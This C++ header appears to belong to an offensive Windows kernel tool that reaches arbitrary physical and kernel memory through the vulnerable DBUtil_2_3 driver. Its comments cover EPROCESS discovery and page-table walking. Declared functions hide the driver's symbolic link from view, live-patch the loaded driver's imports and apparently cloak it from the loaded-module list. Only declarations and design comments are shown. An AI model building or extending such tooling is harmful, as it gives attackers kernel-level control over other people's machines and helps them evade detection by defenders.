#pragma once
#include <cstdint>
#include <cstddef>

namespace r0 {

// Physical-memory backend.
//
// The table below is the *only* place that names the device and the IOCTL
// pairs. Everything above this layer (page-table walking, EPROCESS discovery)
// is backend-agnostic, so swapping the driver is a change to this file only.
//
//   read/write   - PHYSICAL addresses. The driver maps the range with
//                  MmMapIoSpace and copies in or out.
//   vread/vwrite - KERNEL virtual addresses. The driver memmoves in the
//                  caller's context, so the copy is cached and coherent.
//
// Do not use the physical path for kernel addresses: the cached/uncached
// mismatch leaves stale lines in cores reading the same structure. Do not use
// vread for an address you have not derived from a trusted source: a
// non-present kernel VA faults inside the driver's memmove and bugchecks
// (0x50). vmm::kread_trusted() gates every vread behind safe_translate().
struct Backend {
    const wchar_t* device;      // L"\\\\.\\DBUtil_2_3"
    bool (*open)();
    void (*close)();
    bool (*read)(uint64_t pa, void* out, size_t len);         // physical
    bool (*write)(uint64_t pa, const void* in, size_t len);   // physical
    bool (*vwrite)(uint64_t va, const void* in, size_t len);  // kernel VA
    bool (*vread)(uint64_t va, void* out, size_t len);        // kernel VA
};

bool init();
void shutdown();
bool alive();
void set_backend(const Backend* be);

// MmMapIoSpace data-page backend. Active page-table PFN reads are rejected
// on 26200 regardless of cache type and require the section-view backend.
bool pread(uint64_t pa, void* buf, size_t len);
bool pwrite(uint64_t pa, const void* buf, size_t len);
bool phys_read_raw(uint64_t pa, void* buf, size_t len);
bool pmem_probe();
bool vwrite(uint64_t va, const void* buf, size_t len);
bool vread(uint64_t va, void* buf, size_t len);

extern bool g_write_ok;
bool kwtest(uint64_t sys_eproc);

// Prove which half of the kernel-VA pair 0x9B0C1EC4 really is.
bool vread_probe(uint64_t va, size_t len);
bool vread_ready();

// Remove \??\DBUtil_2_3 via NtOpenSymbolicLinkObject + NtMakeTemporaryObject.
// The device object is untouched: an already-open handle keeps working.
bool hide_symlink(const wchar_t* link);

// Live-patch the loaded driver's MmMapIoSpace import to MmCached for ordinary
// data pages. Active page-table PFNs remain unsupported for both cache types.
// Must run BEFORE --cloak (it needs the driver still in PsLoadedModuleList).
bool patch_cached_map(bool dry_run = false, const char* step = nullptr);

} // namespace r0
